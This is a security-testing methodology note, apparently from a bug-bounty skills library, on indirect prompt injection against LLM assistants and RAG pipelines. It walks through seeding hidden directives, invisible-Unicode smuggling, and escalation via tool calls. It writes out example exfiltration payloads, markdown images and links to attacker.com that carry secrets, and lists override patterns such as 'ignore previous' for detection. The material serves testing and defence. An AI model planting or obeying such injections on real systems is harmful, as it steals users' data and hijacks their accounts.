# Indirect Prompt Injection & Data Exfiltration

## Objective & Context
*   **Security Assumption Failure:** The system assumes LLM context retrieved from user-generated content (tickets, docs, emails, web pages, code) carries no instructions, and that model output channels (markdown links, images, rendered HTML) cannot transport data to attacker-controlled endpoints.
*   **Trust Boundary Violation:** Untrusted content is concatenated into a privileged instruction stream; the model cannot distinguish data from directives, and the surrounding application renders/executes the model's output with the user's session and trust.

## Recognition Patterns
*   **Mechanism:** Any LLM feature ingesting external content: chat-with-document, "summarize this page/ticket/PR", AI search with citations, email assistants, code assistants reviewing patches, RAG over shared corpora.
*   **Behaviors:**
    *   Model output is rendered as markdown/HTML with live links or images (fetch-on-render = exfil channel).
    *   Tool-using assistants: the model can compose URLs, trigger fetches, or call APIs based on retrieved content.
    *   No isolation between retrieved-document text and the system prompt; no content-origin labeling.
    *   Shared artifacts (repo files, bug tickets, calendar invites, spreadsheet cells) flow into other users' AI summaries.

## Attack Preconditions
*   Attacker-controlled text can enter the retrieval corpus (public page, IDOR'd field, PR diff, uploaded document).
*   A victim with higher privilege triggers AI processing of that content (support summarization, code review, search).
*   An output channel exists that reaches attacker infrastructure (rendered markdown images/links, server-side fetch tools, outbound webhooks).

## Step-by-Step Validation Strategy
1.  **Injection Seeding:** Plant directives in every content field the pipeline ingests — visible text, HTML comments, invisible Unicode (zero-width chars, tag stripping via `[SYSTEM]` lookalikes, ASCII smuggling), image alt text, and file metadata. Reference: H1 #2372363 (invisible prompt injection), #2370955 (ASCII-decoding training-data poisoning).
2.  **Trigger Simulation:** Open the victim-side flow (or have a collaborator trigger "summarize ticket") and observe whether the model obeys: does it call tools, follow attacker URLs, or echo secrets into generated content?
3.  **Exfil Channel Probing:** For each output surface, test data transport:
    *   Markdown images: `![ ](https://attacker.com/log?d={secret})` — fetch-on-render moves data without any click.
    *   Links: `[Click](https://attacker.com/leak?t={token})` — needs one user click.
    *   Tool-mediated fetch: "fetch this URL" tool calls issued autonomously by the model.
    *   Reference: H1 #2383092 (source/data exfiltration via GitHub Copilot).
4.  **Second-Order Persistence:** Store the payload via IDOR/profile fields/tickets (see `skills/auth_logic/logic_idor_auth.md`) so every future AI touch of the object re-executes the injection — persistent context poisoning, not one-shot.
5.  **Scope Escalation Check:** Combine with tool access: instruct the model to invoke privileged tools (mail, admin APIs, export) using the *victim's* session — the injection becomes a privilege-escalation primitive, not just disclosure.
6.  **Cross-Tenant Confirmation:** Repeat from a second tenant/org to prove the injection crosses the trust boundary (report-worthy) rather than staying self-inflicted.

## Common Weak Implementations
*   Retrieved chunks pasted into the prompt with no delimiting, origin tagging, or instruction-filtering.
*   Markdown/HTML rendering of model output without image/ link origin policy or `CSP` on rendered surfaces.
*   Agent tools (fetch, browser, code-exec) callable from model decisions with no human confirmation on untrusted-derived arguments.
*   ASCII/Unicode normalization that decodes smuggling payloads after moderation screening.
*   Shared workspaces where any tenant's content enters a global RAG index (missing `tenant_id` filter).

## Escalation Paths
*   **Zero-Click Data Theft:** Victim summarizes a poisoned doc; chat history, prior messages, and connected-account data ride out via render-time image fetches.
*   **Account Takeover:** Injection instructs the model to create an API token / change email via available tools, then exfil the result.
*   **Cross-Tenant Espionage:** Persistent payloads in shared objects harvest other organizations' summaries indefinitely.
*   **Supply-Chain Spread:** Poisoned code-review assistants approve/leak across every repo consuming the payload (see MCP skill for config-level escalation).

## Detection Opportunities
*   Egress monitoring on AI output surfaces: alert when model-generated content contains links/images to domains not seen in user input history.
*   Content-origin linting: flag instruction-like patterns (`ignore previous`, `[SYSTEM]`, role tags) entering retrieval from low-trust sources.
*   Canaries: seeded fake secrets in retrieved context — any egress of a canary proves exfil without guessing the exact payload.

## Notes
*   **False Positives:** Self-injection (attacker only attacking their own session) is not a finding; establish cross-user/cross-tenant reach. Model "hallucinating" a URL it never fetched is weak evidence without the transport working.
*   **Constraints:** Requires a render/fetch side effect; some providers now strip images from model markdown — test the actual deployment, not the spec.
*   **Real-world anchors (from the intel vault):** Invisible prompt injection (H1 #2372363), GitHub Copilot exfiltration (H1 #2383092), Brave Leo injection via GitHub patch (H1 #3086301), unauthorized-mention chatbot restriction bypass (H1 #3112106).
*   **Cross-reference:** `skills/emerging/llm_rag_privesc.md` (RAG privilege abuse), `skills/emerging/mcp_agent_tool_poisoning.md` (tool-level execution), `research/case_studies/llm_security/` for full reports.
